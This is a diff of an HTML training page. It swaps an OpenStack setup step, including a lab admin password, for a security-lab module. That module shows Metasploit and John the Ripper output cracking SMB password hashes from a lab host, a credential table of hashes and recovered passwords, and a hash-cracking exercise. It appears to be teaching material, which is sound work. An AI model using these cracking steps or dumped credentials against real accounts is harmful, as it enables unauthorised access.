+fopen: /opt/metasploit/apps/pro/msf3/data/john/run.linux.x86.sse2/password.lst: No such file or directory
+[*] Output: Loaded 5 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
+[*] Output: Remaining 2 password hashes with no different salts
+guesses: 0  time: 0:00:00:04 DONE (Fri Nov 21 18:25:00 2014)  c/s: 5462K  trying: ZEB1900 - ZZZ1900
+[*] Output: Loaded 6 password hashes with no different salts (LM DES [128/128 BS SSE2])
+[*] Output: Remaining 2 password hashes with no different salts
+Warning: mixed-case charset, but the current hash type is case-insensitive;
+some candidate passwords may be unnecessarily tried more than once.
+guesses: 0  time: 0:00:00:06 DONE (Fri Nov 21 18:25:06 2014)  c/s: 25643K  trying: ||V} - |||}
+[*] Output: Loaded 6 password hashes with no different salts (LM DES [128/128 BS SSE2])
+[*] Output: Remaining 2 password hashes with no different salts
+guesses: 0  time: 0:00:00:00 DONE (Fri Nov 21 18:25:07 2014)  c/s: 1307K  trying: 89093 - 89092
+[*] Output: Loaded 6 password hashes with no different salts (LM DES [128/128 BS SSE2])
+[*] Output: Remaining 2 password hashes with no different salts
+[*] cred_18:PASSWORD:e52cac67419a9a224a3b108f3fa6cb6d:7b592e4f8178b4c75788531b2e747687:::
+[*] cred_17:SECCON!:e17a6020453a1523aad3b435b51404ee:d3eb09053fbe2ba3f37e6e773f763827:::
+[*] cred_16::aad3b435b51404eeaad3b435b51404ee:0b5c1b2296ed366332095252c3f83100:::
+[*] cred_14::aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*]
+[*] 5 password hashes cracked, 2 left
+guesses: 0  time: 0:00:00:12 DONE (Fri Nov 21 18:25:19 2014)  c/s: 10921K  trying: zydeco1900 - seccon!1900
+[*] Output: Loaded 5 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
+[*] Output: Remaining 2 password hashes with no different salts
+guesses: 0  time: 0:00:00:05 DONE (Fri Nov 21 18:25:24 2014)  c/s: 32030K  trying: |||}
+[*] Output: Loaded 5 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
+[*] Output: Remaining 2 password hashes with no different salts
+guesses: 0  time: 0:00:00:00 DONE (Fri Nov 21 18:25:24 2014)  c/s: 1709K  trying: 89030 - 89092
+[*] Output: Loaded 5 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
+[*] Output: Remaining 2 password hashes with no different salts
+[*] cred_18:PASSWORD:e52cac67419a9a224a3b108f3fa6cb6d:7b592e4f8178b4c75788531b2e747687:::
+[*] cred_17:seccon!:e17a6020453a1523aad3b435b51404ee:d3eb09053fbe2ba3f37e6e773f763827:::
+[*] cred_14::aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*]
+[*] 3 password hashes cracked, 2 left
+[+] Cracked: user:PASSWORD (192.168.1.4:445)
+[+] Cracked: seccon:seccon! (192.168.1.4:445)
+[+] Cracked: Administrator: (192.168.1.4:445)
+[*] Auxiliary module execution completed
 
-<code>
-yum makecache
-yum -y upgrade
-</code>
+msf auxiliary(jtr_crack_fast) > creds windows
+
+Credentials
+===========
+
+host         port  user              pass                                                               type      proof  active?
+----         ----  ----              ----                                                               ----      -----  -------
+192.168.1.4  445   user              e52cac67419a9a224a3b108f3fa6cb6d:7b592e4f8178b4c75788531b2e747687  smb_hash         true
+192.168.1.4  445   seccon            e17a6020453a1523aad3b435b51404ee:d3eb09053fbe2ba3f37e6e773f763827  smb_hash         true
+192.168.1.4  445   SUPPORT_388945a0  aad3b435b51404eeaad3b435b51404ee:0b5c1b2296ed366332095252c3f83100  smb_hash         true
+192.168.1.4  445   HelpAssistant     4f7f3b0478068dbc155ac748a60cd08d:c99241d31fe8453e3cb865be137309b4  smb_hash         true
+192.168.1.4  445   Administrator     aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0  smb_hash         true
+192.168.1.4  445   Administrator                                                                        password         true
+192.168.1.4  445   seccon            seccon!                                                            password         true
+192.168.1.4  445   user              PASSWORD                                                           password         true
 
 </pre>
 </div>
 </div>
+  <hr><br>
 
-
-<!--
-########################################################################################################################
-Step
-########################################################################################################################
--->
-
-<h3>Step 6 - Create OpenStack client environment scripts</h3>
-<p> OpenStack supports simple client environment scripts also known as OpenRC files. These scripts typically contain
-    common options for all clients,  but also support unique options.</p>
-<p>Create client environment scripts for the admin projects. Future portions of this guide
-    reference these scripts to load appropriate credentials for client operations.</p>
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        8
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-8">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-8">
-<pre># This is the copy group: 8<br>
-
-<code>
-cd ~
-cat &lt;&lt; EOF &gt; admin.sh
-export OS_REGION_NAME=RegionOne
-export OS_PROJECT_DOMAIN_ID=default
-export OS_USER_DOMAIN_ID=default
-export OS_PROJECT_NAME=admin
-export OS_TENANT_NAME=admin
-export OS_USERNAME=admin
-export OS_PASSWORD=cisco.123
-export OS_AUTH_URL=http://10.0.236.101:35357/v3
-export OS_NOVA_AUTH=http://10.0.236.101:5000/v2.0
-export PS1='[\u@\h \W(openstack_admin)]# '
-EOF
-chmod +x admin.sh
-</code>
-
-</pre>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
 </div>
 </div>
 
+<!--end hint -->
 
 
-<!--
-########################################################################################################################
-Step
-########################################################################################################################
--->
-<h3>Step 7 - Verify identity shell</h3>
-<p>You can validate that each shell is working properly by executing the shell command via the <code>#source</code>
-    command.</p>
 
+<hr>
+<h2>Exercise 4: Crack Me If You Can!!!</h2>
+<p>KoreLogic throws a yearly contest held at DefCon called&nbsp;<a href="http://contest-2011.korelogic.com/">Crack Me If You Can</a>. Your VM has the contest from 2011. Using John the Ripper and HashCat, try to crack as many passwords as you can.</p>
 
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        9
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-9">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-9">
-<pre># This is the copy group: 9<br>
-
-<code>
-cd ~; source admin.sh
-</code>
-
-</pre>
-</div>
-</div>
-
+<hr>
+<h3>Bonus</h3>
+<p>Unzip KoreLogic-2011-CrackMeIfYouCan-tree.zip. Using John the Ripper and HashCat, try to crack as many passwords as you can.</p>
 
 
 
@@ -667,8 +771,8 @@ cd ~; source admin.sh
     <div style="float:right; font-size: .9em;">
 
             <div class="btn-group">
-                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;/pod1/basics/lldp&#39;">Next: LLDP Daemon</button>
-                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;/pod1/basics/lldp&#39;">
+                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;module8.html&#39;">Next: Module 8</button>
+                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;module8.html&#39;">
                         <span class="glyphicon glyphicon-chevron-right" style="color:white;" aria-hidden="true"></span>
                 </button>
             </div>
